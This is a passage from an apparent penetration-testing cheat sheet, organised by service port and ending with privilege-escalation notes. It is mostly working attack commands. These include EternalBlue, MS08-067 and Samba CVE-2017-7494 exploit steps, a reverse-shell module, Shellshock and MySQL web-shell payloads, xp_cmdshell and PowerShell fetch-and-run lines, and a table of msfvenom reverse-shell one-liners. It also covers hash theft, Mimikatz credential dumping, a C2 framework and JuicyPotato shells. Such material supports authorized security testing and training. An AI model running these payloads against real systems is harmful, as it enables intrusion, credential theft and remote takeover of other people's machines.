  - `smbclient //<IP>/<SHARE> -U <USER>`

- Get a shell
  - `psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>`
  - `psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>`

  - `wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>`
  - `wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>`

  - `smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>`
  - `smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>`

  - `atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>`
  - `atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>`

- EternalBlue (MS17-010)
  - <https://github.com/3ndG4me/AutoBlue-MS17-010>

- Check if vulnerable
  - `python eternal_checker.py <IP>`

- Prepare shellcodes and listeners
  - `cd shellcode`
  - `./shell_prep.sh`
  - `cd ..`
  - `./listener_prep.sh`

- Exploit
  - `python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin`
    - May need to run it multiple times

  - If this doesn’t work, try this one
    - `python zzz_exploit.py <IP>`

- MS08-067
  - Download exploit code
    - `git clone https://github.com/andyacer/ms08_067.git`

  - Generate payload
    - `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows`
    - `msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows`

  - Modify
    - Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

  - Listener
    - `nc -lvp <PORT>`

  - Exploit
    - `python ms08_067_2018.py <IP> <NUMBER> 445`

- CVE-2017-7494
  - Download exploit code
    - `git clone https://github.com/joxeankoret/CVE-2017-7494`
    - Create a new file named poc.c :
    ```
      #include <stdio.h>
      #include <stdlib.h>

      int samba_init_module(void)
      {
        setresuid(0,0,0);
        system("ping -c 3 <IP>");
      }
    ```
  - Build
    - `gcc -o test.so -shared poc.c -fPIC`
  
  - Start an ICMP listener
    - `sudo tcpdump -i <INTERFACE> icmp`

  - Exploit
    - `./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so`
  
  - If you reiceve 3 pings on your listener then the exploit works. Now let’s get a shell :
    ```
    #include <stdio.h>
    #include <stdlib.h>

    int samba_init_module(void)
    {
      setresuid(0,0,0);
      system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f");
    }
    ```

  - Build
    - `gcc -o test.so -shared poc.c -fPIC`
  - Start a listener
    - `nc -lvp <PORT>`

  - Exploit
    - `./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so`


## MSSQL - 1433
- Get information
  - `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>`

- Brute force
  - `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u`

- Having credentials
  - `mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>`
  - `mssqlclient.py <USER>:<PASSWORD>@<IP>`

- Once logged in you can run queries:
  - `SQL> select @@ version;`

- Steal NTLM hash
  - `sudo smbserver.py -smb2support liodeus .`
  - `SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat`

- Try to enable code execution
  - `SQL> enable_xp_cmdshell`

- Execute code
  - `SQL> xp_cmdshell whoami /all`
  - `SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe`

- Manual exploit
  - Cheatsheet :
    - <https://www.asafety.fr/mssql-injection-cheat-sheet/>


## NFS - 2049
- [Guide](https://www.youtube.com/watch?v=FlRAA-1UXWQ&feature=youtu.be)
- Show Mountable NFS Shares
  - `showmount -e <IP>`
  - `nmap --script=nfs-showmount -oN mountable_shares <IP>`

- Mount a share
  - `sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>`
  - `sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>`

- NFS misconfigurations
  - List exported shares
    - `cat /etc/exports`
    - If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.

- Attacker, as root user
  ```
  mkdir <DIRECTORY>
  mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
  cd <DIRECTORY>
  echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
  gcc pwn.c -o pwn
  chmod +s pwn
  ```

- Victim
  - `cd <SHARE>`
  - `./pwn # Root shell`


## MYSQL - 3306
- Brute force
  - `hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u`

- Extracting MySQL credentials from files
  - `cat /etc/mysql/debian.cnf`
  - `grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"`

- Connect
  - Local
    - `mysql -u <USER>`
    - `mysql -u <USER> -p`

- Remote
  - `mysql -h <IP> -u <USER>`

- MySQL commands
  ```
  show databases;
  use <DATABASES>;

  show tables;
  describe <TABLE>;

  select * from <TABLE>;

  # Try to execute code
  select do_system('id');
  \! sh

  # Read & Write
  select load_file('<FILE>');
  select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
  ```

- Manual exploit
  - Cheatsheet :
    - <https://www.asafety.fr/mysql-injection-cheat-sheet/>


## RDP - 3389
- Brute force
  - `crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>`
  - `crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>`
  
  - `hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV`

- Connect with known credentials / hash
  - `rdesktop -u <USERNAME> <IP>`
  - `rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>`

  - `xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>`
  - `xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>`

- Session stealing
  - Get openned sessions
    - `query user`
  - Access to the selected
    - `tscon <ID> /dest:<SESSIONNAME>`
  - Adding user to RDP group (Windows)
    - `net localgroup "Remote Desktop Users" <USER> /add`


## VNC - 5800 - 58001 - 5900 - 5901
- Scans
  - `nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>`

- Brute force
  - `hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV`

- Connect
  - `vncviewer <IP>:<PORT>`

- Found VNC password
  - Linux
    - Default password is stored in: ~/.vnc/passwd
  - Windows
    - RealVNC
    - HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

    - TightVNC
    - HKEY_CURRENT_USER\Software\TightVNC\Server

    - TigerVNC
    - HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

    - UltraVNC
    - C:\Program Files\UltraVNC\ultravnc.ini

- Decrypt VNC password
  ```
  msfconsole
  irb
  fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
  require 'rex/proto/rfb'
  Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
  /dev/nul
  ```


## WINRM - 5985 - 5986
- Brute force
  - `crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>`
- Connecting
  - `evil-winrm -i <IP> -u <USER> -p <PASSWORD>`
  - `evil-winrm -i <IP> -u <USER> -H <HASH>`


## CGI
- Found CGI scripts
  - `ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <URL>/ccgi-bin/FUZZ -t 50`
  - `ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u <URL>/ccgi-bin/FUZZ -t 50`
  - `ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100`
  - If a script is found try SHELLSHOCK.
    - SHELLSHOCK
      - `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>`

- Command and control framework
  ```
  # Download
  git clone https://github.com/mhaskar/Octopus/tree/v1.2

  # Install requirements
  pip install -r requirements.txt

  # Usage
  ./octopus.py

  # Listener (exemple)
  listen_http <BIND_IP> <BIND_PORT> <HOSTNAME> <INTERVAL_IN_SECONDS> <URL> <LISTENER_NAME>
  listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

  # Agent (exemple)
  generate_powershell <LISTENER_NAME>
  generate_powershell listener_1
  ```

- Compiling exploits
- For linux
  - 64 bits
    - gcc -o exploit exploit.c

  - 32 bits
    - gcc -m32 -o exploit exploit.c
- For windows
  - To compile Win32 bit executables: `execute i686-w64-mingw32-gcc -o <FILE.exe> <FILE.c>`
  - To compile Win64 bit executables: `execute x86_64-w64-mingw32-gcc -o <FILE.exe><FILE.c>`
  - To Compiled .cpp source file: `execute i586-mingw32msvc-g++ -o <FILE>.exe <FILE>.cpp`
  - To compile python scripts: `pyinstaller --onefile <SCRIPT.py>`

- Compile windows .exe on Linux
  - `i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe`

- Cross compile
  - `gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c`


## DICTIONARY GENERATION
- `cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>`
- `crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt`


## FILE TRANSFER
- [Transferring Files to Windows](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)
- [Transferring Files to Linux](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files.html)
- Browser
  - Navigate to the file on the site and download it directly
- Linux
  - PYTHON (HTTP)
    - `python -m SimpleHTTPServer <PORT>`
  - PYTHON
    - `python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"`

  - FTP
    - `sudo python3 -m pyftpdlib  -p 21 -w`

  - SMB
    - `sudo smbserver.py -smb2support liodeus .`

  - WGET
    - `wget <URL> -o <OUT_FILE>`

  - CURL
    - `curl <URL> -o <OUT_FILE>`

  - NETCAT
    - `nc -lvp 1234 > <OUT_FILE>`
    - `nc <IP> 1234 < <IN_FILE>`

  - SCP
    - `scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>`

- Windows
  - FTP
    - `echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt`
    - `ftp -v -n -s:ftp.txt`

  - SMB
    - Linux -> Windows
      - `copy \\<IP>\<PATH>\<FILE>`
    - Windows -> Linux
      - `copy <FILE> \\<IP>\<PATH>\`

  - Powershell
    - `powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')`
    - `powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')`
    - `powershell "wget <URL>"`

  - Python
    - `python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"`

  - CertUtil
    - `certutil.exe -urlcache -split -f "<URL>"`
    - `certutil.exe -urlcache -f https//10.10.10.10/file.txt file.txt`

  - NETCAT
    - `nc -lvp 1234 > <OUT_FILE>`
    - `nc <IP> 1234 < <IN_FILE>`

  - CURL
    - `curl <URL> -o <OUT_FILE>`


## GIT
- Download .git
  - `mkdir <DESTINATION_FOLDER>`
  - `./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>`

- Extract .git content
  - `mkdir <EXTRACT_FOLDER>`
  - `./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>`


## HASHES
- Windows
  - `reg save HKLM\SAM c:\SAM`
  - `reg save HKLM\System c:\System`

  - samdump2 System SAM > hashes

- Linux
  - unshadow passwd shadow > hashes


## MIMIKATZ
- privilege::debug
- 
  ```
  sekurlsa::logonpasswords
  sekurlsa::tickets /export

  kerberos::list /export

  vault::cred
  vault::list

  lsadump::sam
  lsadump::secrets
  lsadump::cache
  ```


## MSFVENOM PAYLOAD
- [MSFVEMON CheatSheet netsec](https://netsec.ws/?p=331)
- [MSFVEMON CheatSheet hacktricks](https://book.hacktricks.xyz/shells/shells/untitled)
- [MSFVEMON CheatSheet rapid7](https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675)
- [MSFVEMON CheatSheet thor-sec](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
- [MSFVEMON CheatSheet security-geek](http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/)
- [MSFVEMON CheatSheet frizb](https://github.com/frizb/MSF-Venom-Cheatsheet)
- Linux
  - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf`
- Windows
  - `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe`
- PHP
  - `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`

  - Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
  - cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
- ASP
  - `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp`
- JSP
  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`
- WAR
  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`
- Python
  - `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py`
- Bash
  - `msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh`
- Perl
  - `msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl`
- MSFVenom Cheatsheet
Single Page Cheatsheet for common MSF Venom One Liners  
Available in PDF, DOCX and Markdown format!
*PDF and DOCX versions contain the payload size in bytes and a few more commands.*


- MSFVenom Cheatsheet

| MSFVenom Payload Generation One-Liner | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
|    msfvenom -l   payloads                                                                                                                                                                 |    List available payloads                                     |
|    msfvenom -p PAYLOAD --list-options                                                                                                                                                                 |    List payload options                                     |
|    msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP                                                                                                        |    Payload Encoding                                            |
|    msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                           |    Linux Meterpreter  reverse shell x86 multi stage            |
|    msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                              |    Linux Meterpreter  bind shell x86 multi stage               |
|    msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                      |    Linux bind shell x64 single stage                           |
|    msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                   |    Linux reverse shell x64 single stage                        |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                             |    Windows Meterpreter reverse shell                           |
|    msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe                                                                                             |    Windows Meterpreter http reverse shell                           |
|    msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe >   shell.exe                                                                                               |    Windows Meterpreter bind shell                              |
|    msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                                   |    Windows CMD Multi Stage                                     |
|    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe >  shell.exe                                                                                                     |    Windows CMD Single Stage                                    |
|    msfvenom -p   windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                           |    Windows add user                                            |
|    msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho >   shell.macho                                                                                               |    Mac Reverse Shell                                           |
|    msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  >  shell.macho                                                                                                  |    Mac Bind shell                                              |
|    msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw >   shell.py                                                                                                      |    Python Shell                                                |
|    msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw >   shell.sh                                                                                                        |    BASH Shell                                                  |
|    msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw >   shell.pl                                                                                                        |    PERL Shell                                                  |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp >   shell.asp                                                                                             |    ASP Meterpreter shell                                       |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.jsp                                                                                                  |    JSP Shell                                                   |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war >   shell.war                                                                                                  |    WAR Shell                                                   |
|    msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.php   cat shell.php | pbcopy && echo '?php ' | tr -d '\n'    shell.php && pbpaste  shell.php    |    Php Meterpreter Shell                                       |
|    msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  >  phpreverseshell.php                                                                                                   |    Php Reverse Shell                                           |
|    msfvenom -a x86   --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object   Net.webClient).downloadString('http://IP/nishang.ps1')\""   -f python                        |    Windows Exec Nishang Powershell in   python   |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |

## Multihandler Listener
To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
```
msf>use exploit/multi/handler  
msf>set payload windows/meterpreter/reverse_tcp  
msf>set lhost <IP>  
msf>set lport <PORT>  
msf> set ExitOnSession false  
msf>exploit -j  
```
The -j option is to keep all the connected session in the background.  


- Listener
  - Metasploit
    - `use exploit/multi/handler`
    - `set PAYLOAD <PAYLOAD>`
    - `set LHOST <LHOST>`
    - `set LPORT <LPORT>`
    - `set ExitOnSession false`
    - `exploit -j -z`
  - Netcat
    - `nc -lvp <PORT>`


## PASSWORD CRACKING
- Online
  - Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
  - [decrypt/hash](https://hashes.com/en/decrypt/hash)

- Hashcat
  - Linux password
    - `hashcat -m 1800 -a 0 hash.txt rockyou.txt`
    - `hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule`
  - Windows password
    - `hashcat -m 1000 -a 0 hash.txt rockyou.txt`
    - `hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule`
  - Others
    - `hashcat --example-hashes | grep -i '<BEGINNING_OF_HASH>'`
  - Rules
    - [NotSoSecure/password_cracking_rules](https://github.com/NotSoSecure/password_cracking_rules)
- John
  - `john --wordlist=<PASSWORDS_LIST> hash.txt`


## PIVOTING
- sshuttle
  - `sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR`
- Proxychains
  - `ssh -f -N -D 9050 <USER>@<IP>`
  - `proxychains <COMMAND>`
- Interesting link
  - [Pivoting-Guide](https://artkond.com/2017/03/23/pivoting-guide/)


## LINUX PRIVILEGE ESCALATION
### Linux PrivEsc Courses
- [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
- [Linux Privilege Escalation for OSCP & Beyond! = Tib3rius](https://www.udemy.com/course/linux-privilege-escalation/)
- [Linux Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/)

### PrivEsc Cheatsheets/Scripts
- [Linux privilege escalation (enumeration) script - LinEnum.sh](https://github.com/rebootuser/LinEnum)
- [Abusing SUDO (Linux Privilege Escalation)](https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/)
- [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [GTFOBins](https://gtfobins.github.io/)
- [g0tmi1k - basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [sushant747 - privilege_escalation_-_linux](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)
- [hacktricks - linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
- [swisskyrepo - privilege_escalation_Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [lucyoa - kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [Linux Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/)

#### Attacks
- Enumeration scripts
  - `bash LinEnum.sh`
  - `bash lse.sh -l 1`
  - `bash linpeas.sh`
  - `python linuxprivchecker.py`
  - `./unix-privesc-check standard`
  - `curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`

#### Vulnerability scan
- `perl les2.pl`
- `bash les.sh`

#### Suid checker
- `python suid3num.py`
- <https://gtfobins.github.io/>

#### Methodology to follow
- <https://guif.re/linuxeop>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>
- 
  ```
  sudo -l
  Kernel Exploits
  OS Exploits
  Password reuse (mysql, .bash_history, 000- default.conf...)
  Known binaries with suid flag and interactive (nmap)
  Custom binaries with suid flag either using other binaries or with command execution
  Writable files owned by root that get executed (cronjobs)
  MySQL as root
  Vulnerable services (chkrootkit, logrotate)
  Writable /etc/passwd
  Readable .bash_history
  SSH private key
  Listening ports on localhost
  /etc/fstab
  /etc/exports
  /var/mail
  Process as other user (root) executing something you have permissions to modify
  SSH public key + Predictable PRNG
  apt update hooking (PreInvoke)
  ```


### Linux Priv Esc troubleshooting
- Did you check all cronjobs?
- Did you check all processes running as root or another user?
- Did you see if mountable file systems are available?
- Did you check for config files?
- Did you check /var/www/?
- Did you check all home dirs?
- .ssh?
- .bash_history?~~


### Linux Troubleshooting
- Did an RCE test work but your payload fail?
- Try changing single quotes to double quotes or in some cases, like a powershell command, try double to triple and vice versa
- Try escaping special characters
- Try changing your outgoing port to a more commonly used one (80, 443, 21, 22, etc)
- Try removing bad characters
  - ex: `cat reverse.ps1 OR echo -n "cmd" | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard`
    - `powsershell-enc base64scriptpaste`
- If you used msfvenom make sure your archicitecture is correct
- If you used msfvenom make sure your payload size isn't too large
- If you used msfvenom try pivoting options
- Is your file transfer failing
- do you have write access to the CWD?


## WINDOWS PRIVILEGE ESCALATION
### WINDOWS PrivEsc Courses
- [PrivEsc Strategy](https://www.youtube.com/watch?v=VpNaPAh93vE)
- [Windows Privilege Escalation for OSCP & Beyond! - Tib3rius](https://www.udemy.com/course/windows-privilege-escalation/)
- [Windows Privilege Escalation for Beginners - TCM](https://www.udemy.com/course/)
- [absolomb - 2018-01-26-Windows-Privilege-Escalation-Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

### PrivEsc Resources
- [sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
- [FuzzySecurity](https://www.fuzzysecurity.com/tutorials/16.html)
- [Windows Exploit Suggester - AonCyberLabs](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Windows Exploit Suggester - 7Ragnarok7](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)
- [Windows privilege escalation (enumeration) script - Powerless](https://github.com/M4ximuss/Powerless)
- [Windows privilege escalation (enumeration) script - PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [Scripts - PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [Win Priv Escl](https://github.com/frizb/Windows-Privilege-Escalation)
- [swisskyrepo - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
- [sushant747 - privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

#### Attacks
- Test if powershell is working without breaking shell
- `powershell whoami`
- Pivot DoS to powershell using Nishang reverse powershell script.
- Listen w/ nc on a new port.
- Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
- Start an HTTP server in the root directoy of the modified nishang script copy
- Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
- Go to your listener terminal, you should now have a reverse PS shell
- Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
- `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
- Download file
- PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
- Run cmd as other user
- PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
- DOS > `\Windows\System32\runas.exe`
- Run exe
- PS from working directory `Start-Process -FilePath "sort.exe"`
- PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
- PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
- PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
- Decrypy SAM password hashes
- `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
- Determine admin accounts
- DOS: `net localgroup administrators`
- SAM and SYSTEM file location
- `Windows/System32/config`
- Log into remote windows host with stolen creds (SMB required)
- `psexec.py user@ip`
- Find shortcut location (`*.lnk`)
- PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
- Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
- Check panther directory, install logs get put in here and contain creds
- Read contents of file in PS shell
- `get-Content "filename"`

#### Enumeration scripts
- General scans
  - `winPEAS.exe`
  - `windows-privesc-check2.exe`
  - `Seatbelt.exe -group=all`
  - `powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"`
  - `Powerless.bat`
  - `winPEAS.bat`


#### Search for CVE
- systeminfo > systeminfo.txt
  - `python windows-exploit-suggester.py --update`
  - `python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt`

- wmic qfe > qfe.txt
  - `python wes.py -u`
  - `python wes.py systeminfo.txt qfe.txt`

- Run CVE Script (Like SHerlock.ps1)
  - `powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"`

#### Post exploitation
- Methodology to follow
  - <https://guif.re/windowseop>
  - <https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/>
  - <https://mysecurityjournal.blogspot.com/p/client-side-attacks.html>
  - <http://www.fuzzysecurity.com/tutorials/16.html>
  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>

- Good Post Exploitation ExE's
  - `lazagne.exe all`
  - `SharpWeb.exe`
  - `mimikatz.exe`

- JuicyPotato (SeImpersonate or SeAssignPrimaryToken)
  - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

    - `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *`
    - `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>`

  - CLSID
    - <https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md>

